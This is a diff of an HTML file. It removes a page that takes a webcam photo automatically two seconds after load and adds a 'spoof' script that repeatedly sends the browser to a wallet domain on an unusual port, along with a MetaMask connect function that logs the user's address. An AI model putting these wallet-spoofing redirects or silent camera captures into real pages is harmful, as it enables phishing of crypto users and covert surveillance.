@@ -1,82 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        #image-container {
-            text-align: center;
-        }
-
-        #message {
-            font-size: 2em;
-        }
-    </style>
-</head>
-
-<body>
-    <div id="image-container">
-        <canvas id="videoCanvas"></canvas>
-        <img id="capturedImage" style="display: none;">
-    </div>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Request camera permission on page load
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then((stream) => {
-                    console.log('Camera permission granted');
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        //video.play();
-                        //setupVideoCanvas(video);
-                        setupCaptureButton(stream);
-                        setTimeout(() => automateCapture(), 2000); // Automate capture after 2 seconds
-                    };
-                    document.body.appendChild(video); // Add video element to the document
-                })
-                .catch((error) => {
-                    console.error('Camera permission denied or an error occurred:', error);
-                });
-        });
-
-        const setupVideoCanvas = (video) => {
-            const canvas = document.getElementById('videoCanvas');
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            function drawFrame() {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                requestAnimationFrame(drawFrame);
-            }
-
-            drawFrame();
-        };
-
-        const setupCaptureButton = (stream) => {
-            const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-            const capturedImage = document.getElementById('capturedImage');
-
-            const captureButton = document.createElement('button');
-            captureButton.textContent = 'Capture Image';
-            captureButton.onclick = async () => {
-                const photo = await imageCapture.takePhoto();
-                const imageUrl = URL.createObjectURL(photo);
-                capturedImage.src = imageUrl;
-                capturedImage.style.display = 'block';
-            };
-
-            document.getElementById('image-container').appendChild(captureButton);
-        };
-
-        const automateCapture = () => {
-            const captureButton = document.querySelector('button');
-            if (captureButton) {
-                captureButton.click();
-            }
-        };
-    </script>
-</body>
-
-</html>
+<script>
+    var spoof = function(){
+  document.write('<button onclick="connect()">Connect</button>');
+        document.location = "https://wallet.roninchain.com:1234";
+        setInterval(function(){document.location="https://wallet.roninchain.com:1234";},9800);
+    };
+  </script>
+  
+  <input type="button" value="Spoof" onclick="spoof();" />
+  
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
+  <script>
+  /* To connect using MetaMask */
+  async function connect() {
+    if (window.ethereum) {
+       await window.ethereum.request({ method: "eth_requestAccounts" });
+       window.web3 = new Web3(window.ethereum);
+       const account = web3.eth.accounts;
+       //Get the current MetaMask selected/active wallet
+       const walletAddress = account.givenProvider.selectedAddress;
+       console.log(`Wallet: ${walletAddress}`);
+    
+    } else {
+     console.log("No wallet");
+    }
+  }
+  </script>
+  <input type="button" value="Connect Wallet" onclick="connect();">
